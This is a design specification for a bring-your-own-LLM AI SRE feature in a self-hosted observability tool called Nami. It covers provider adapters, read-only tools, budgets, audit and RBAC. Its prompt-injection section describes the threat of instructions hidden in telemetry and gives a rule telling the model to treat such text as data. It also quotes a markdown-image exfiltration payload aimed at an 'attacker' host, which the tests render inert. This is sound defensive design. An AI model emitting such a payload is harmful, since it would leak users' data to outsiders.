# AI SRE (bring your own LLM)

## Context

Tenth sub-project (roadmap §10), mirroring Better Stack AI SRE for a
self-hosted install: the operator brings an LLM — the Anthropic API by
default, or any OpenAI-compatible endpoint such as a local model — and
Nami explains, investigates and drafts over data it already stores (logs,
metrics, traces, errors, incidents, uptime). Needs Logs, Incident
Management, Metrics, Traces and Error tracking. It runs before Platform +
hardening, so it keeps its own audit table (`ai_calls`, forwarded later
with the audit log) and its own internal tool layer (Platform's MCP
server is separate).

## Goals

### Provider configuration (instance-wide, global admin)

- `ai_settings` (single row): `enabled` (default false), `provider`
  (`anthropic` | `openai_compatible`), `model` (default
  `claude-sonnet-5-5`), `base_url` (default `https://api.anthropic.com`;
  e.g. `http://ollama:11434/v1` for a local model), `api_key_enc`
  (AES-GCM with `NAMI_ENCRYPTION_KEY`, write-only; optional for local
  endpoints), `max_tokens` per call (default 8,000), budgets (below), and
  per-MTok prices for input, output, cache read and cache write (defaults
  for the default model from Anthropic's published pricing at
  implementation time; as of 2026-09: $2 input, $10 output, $0.20 cache
  read).
- Projects can opt out (`projects.ai_enabled`, default true once the
  instance is enabled). The settings page states that prompts include
  project telemetry and leave the instance when the provider is external.
- "Test connection" sends a minimal request and reports model, latency
  or the provider's error (with credentials removed).

### Provider adapters (reqwest, no SDK)

- Anthropic: `POST {base_url}/v1/messages` with `x-api-key`,
  `anthropic-version: 2023-06-01`, `stream: true` (SSE: `message_start`,
  `content_block_delta` with `text_delta` / `input_json_delta`,
  `message_delta` with `stop_reason` and usage, `message_stop`).
  - Tools are declared with `input_schema` and `strict: true`;
    `tool_choice` is always `auto` (forced tool choice is rejected by
    `claude-sonnet-5-5`).
  - Tool loop: on `stop_reason: tool_use`, run every `tool_use` block,
    return all `tool_result` blocks (failures with `is_error: true`) in
    one user message, append the assistant content unchanged (thinking
    blocks included; history is append-only), repeat. `max_tokens` and
    `refusal` stop reasons end the run with a visible notice.
  - The system prompt and tool list are stable and come first, with a
    `cache_control` breakpoint, so repeated calls hit the prompt cache;
    telemetry always follows it.
- OpenAI-compatible: `POST {base_url}/chat/completions` with function
  `tools`, `tool_calls` and `role: "tool"` messages, streamed until
  `[DONE]`.
- Usage per call: Anthropic `input_tokens`, `output_tokens`,
  `cache_creation_input_tokens`, `cache_read_input_tokens`; OpenAI
  `prompt_tokens`, `completion_tokens`; a local server that reports none
  is estimated at characters / 4 (flagged as estimated).
- Timeouts: 120 s per call, 5 min per run. Requests use the shared
  outbound HTTP client; Platform's outbound policy applies once it lands
  (default allow, which a local model on a private network needs).

### Read-only tools

Shared by the automatic investigation and chat: `search_logs`,
`log_patterns`, `query_metrics`, `list_metric_names`, `list_incidents`,
`get_incident` (with timeline), `list_monitors`, `get_monitor_stats`
(status, recent checks, availability), `search_traces`, `get_trace`,
`service_stats`, `list_error_issues`, `get_error_issue` (latest event),
`list_releases`, `who_is_on_call`.

- Each tool validates its input against its schema and calls the same
  query functions as the REST handlers, as the asking user: project
  access is re-checked on every call (access lost mid-conversation → the
  tool returns 403 to the model). Automatic investigations act for the
  incident's project only.
- Results are capped (50 rows, 16 KiB per result, truncation stated in
  the result).
- Tools run in read-only Postgres transactions and with ClickHouse
  `readonly=1`. The registry holds no tool that writes, sends or calls
  out.

### Features

- **Explain with AI** on an incident, a log line and an error issue. The
  engine builds a bounded context — incident: title, cause, timeline,
  recent checks of its monitor; log line: the line plus 20 neighbours
  from the same source within ±1 min and its pattern's counts; error
  issue: latest event (exception chain, frames, breadcrumbs), counts,
  releases — and streams one answer (no tools) into a side panel through
  the BFF (SSE). On incidents a member may "Post to timeline" (`ai_note`
  event).
- **Automatic investigation** (per project, off by default, optional
  minimum severity): when an incident opens, a durable job (`ai_jobs`,
  one per incident) gathers the source's recent checks, pings or alert
  query, error-level logs and pattern shifts within ±15 min, related
  metric series, new or spiking error issues within ±30 min, services
  whose error rate rose, and releases first seen in the last 2 h, then
  runs the agent (<= 15 tool calls, 5 min, per-run token cap). The result
  — summary, suspected cause, and evidence linking the log query, issue,
  trace or chart behind each claim — is posted as an `ai_investigation`
  timeline event labeled "AI-generated (model …), may be wrong". It
  notifies no one.
- **Post-mortem draft** on a resolved incident: drafted from the
  timeline, comments and investigation into the post-mortem editor as an
  unsaved draft; a member reviews and saves it.
- **Chat** per project (`/projects/[id]/ai`): conversations private to
  their user (`ai_conversations`, `ai_messages`, deletable by the user),
  streamed answers, every tool call shown (name, arguments, row count).

### Budgets

`daily_token_budget` (instance, per UTC day), `per_user_daily_token_budget`
and optional `daily_cost_budget_usd` (from the configured prices). A call
starts only if the remaining budget covers its `max_tokens` plus its
estimated input; actual usage is recorded afterwards. Over budget → 429
`ai_budget_exceeded`; automatic investigations are skipped with a
timeline note.

### Prompt-injection posture

- Telemetry (logs, error messages, incident titles from integrations or
  the report form, trace attributes, RUM data) is untrusted data. It
  enters only as tool results or delimited data blocks, never as system
  instructions, and the system prompt says to treat it as data.
- Tools are read-only and scoped to what the user can already read, so a
  successful injection can at most shape text.
- No outbound action without a human click: posting to the timeline,
  saving a post-mortem, creating tickets and notifying anyone are always
  user actions.
- AI output renders as sanitized markdown: no raw HTML, no images, and
  only links to Nami's own origin are clickable (others render as plain
  text), which blocks exfiltration through `![](https://attacker/?q=…)`.

### Audit

`ai_calls`: user (null for automatic runs), project, feature
(`explain_incident`, `explain_log`, `explain_error`, `investigation`,
`postmortem`, `chat`), provider, model, token usage (with the estimated
flag), cost, duration, status (`ok`, `error`, `refused`,
`budget_exceeded`, `cancelled`) and tool calls (name, arguments, result
size — not result content). Every call is recorded, including failed and
rejected ones; kept 365 days. Global admins get an AI usage page
(filters, daily tokens and cost); conversation content stays with its
owner.

### UI

Admin AI settings (provider, model, base URL, key, budgets, prices, test
connection); project setting for automatic investigation; "Explain with
AI" on incident, log row and issue pages; investigation card in the
incident timeline; "Draft with AI" in the post-mortem editor; chat page;
AI usage page.

### RBAC

Global admins configure the provider and see the usage page. Project
viewers may use Explain and chat within their projects (reads only);
members also post to the timeline, draft post-mortems and toggle
automatic investigation.

## Security requirements (tested)

A scripted fake provider (wiremock, Anthropic and OpenAI shapes) drives
the tests.

- RBAC per tool call: a model-requested call for a project the user
  cannot read returns 403 and leaks nothing; revoking membership
  mid-conversation takes effect on the next call.
- Read-only: the registry contains no mutating tool (enumeration test);
  a tool that attempts a write fails inside its read-only transaction.
- Output rendering: `<script>`, `<img>`, `![](https://…)`, `javascript:`
  and external links render inert or as text.
- API key: encrypted at rest, absent from responses, logs, `ai_calls` and
  error messages.
- Budgets: instance and per-user caps → 429; investigations stop at the
  cap.
- Audit completeness: every call, including errors and budget
  rejections, writes an `ai_calls` row.
- Conversations: another user's conversation → 403.
- Disabled instance or opted-out project: the fake provider receives
  zero requests.

## Non-goals

Autonomous remediation (no write tools; never runs commands, restarts
services or changes configuration), pull-request creation, AI chat in
Slack or Teams, prompt-to-dashboard, dashboard import, embeddings / RAG
over history, per-project providers, fine-tuning.
